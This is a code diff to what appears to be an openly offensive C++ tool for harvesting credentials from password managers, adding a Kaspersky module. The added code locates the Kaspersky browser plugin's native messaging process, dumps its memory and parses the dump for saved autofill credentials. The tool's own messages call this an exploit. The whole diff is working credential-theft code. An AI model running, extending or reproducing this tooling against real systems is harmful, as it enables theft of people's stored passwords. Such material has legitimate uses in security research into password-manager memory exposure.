@@ -46,6 +46,7 @@
 #include "../avira/getCredsavira2.h"
 #include "../passwordboss/app/getCredspasswordbossapp1.h"
 #include "../passwordboss/app/getCredspasswordbossapp2.h"
+#include "../kaspersky/getCredsKasperskyEntries.h"
 
 
 int checkApps() {
@@ -76,7 +77,7 @@ int checkApps() {
     }
 
     std::cout << "Enter the name of the password manager (accepted values, 1password, avira, \n";
-    std::cout << "bitdefender, bitwarden, brave, chrome, dashlane, firefox, ironvest, keeper,\n";
+    std::cout << "bitdefender, bitwarden, brave, chrome, dashlane, firefox, ironvest, kaspersky, keeper,\n";
     std::cout << "lastpass, msedge, norton, passwarden, passwordboss, roboform ): ";
     std::cin >> userInput;
     
@@ -814,6 +815,64 @@ int checkApps() {
         std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
 
+    //kaspersky
+    if (userInput == "kaspersky") {
+        std::cout << "User input matches 'kaspersky'.\n";
+        std::cout << "After communicating with the browser plugin, wait for 1 min to retrieve entries.\n";
+        std::cout << "In this browser plugin, the Native Messaging Server process is needed.\n";
+        std::cout << "Only the autofill entries will be available.\n";
+        std::cout << "This exploit only works in Chrome. ";
+        const char* processName = "plugin-nm-server-v2.exe";
+
+        wchar_t username[256];
+        DWORD usernameSize = sizeof(username) / sizeof(username[0]);
+
+        if (GetUserNameW(username, &usernameSize)) {
+            // Replace this value with the extension name you want to check
+            std::wstring extensionName = L"dhnkblpjbkfklfloegejegedcafpliaa";
+
+            //Double check
+            if (findPlugin(username, extensionName)) {
+                std::wcout << L"Directory exists!" << std::endl;
+            }
+            else {
+                std::wcout << L"Directory does not exist." << std::endl;
+                std::wcout << L"Stop execution.\n" << std::endl;
+                return 1;
+            }
+        }
+        else {
+            std::wcerr << L"Failed to get the current user's login name." << std::endl;
+            return 1;
+        }
+
+        // Step 1: Find PIDs by process name
+        std::vector<DWORD> pids;
+
+        //same mode as we have only one process with that name
+        if (mode == "fast" || mode == "full") {
+            fileInput = "app.dmp";
+
+            // Step 1: Find PIDs by process name
+            DWORD pid = FindSimpleProcPID(processName);
+
+            if (pid != 0)
+            {
+                // Step 2: Create a dump file for the process with the second-largest size
+                saveDump(pid);
+            }
+            else
+            {
+                std::cerr << "No process with this PID found." << std::endl;
+            }
+        }
+
+        std::cout << "Searching for entries.\n";
+        getCredsEntrieskasperskyPlugin(fileInput);
+        std::cout << "Done!\n";
+        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+    }
+
     //roboform app
     std::string userInput3;
     if (userInput == "roboform") {
@@ -1430,7 +1489,7 @@ int checkApps() {
         && userInput != "msedge" && userInput != "lastpass" && userInput != "roboform"
         && userInput != "bitwarden" && userInput != "norton" && userInput != "bitdefender"
         && userInput != "ironvest" && userInput != "passwarden" && userInput != "avira"
-        && userInput != "passwordboss") {
+        && userInput != "passwordboss" && userInput != "kaspersky") {
         std::cout << "User input did not match a specific password manager.\n";
         std::cout << "The input must be case-sensitive.\n";
         return 1;
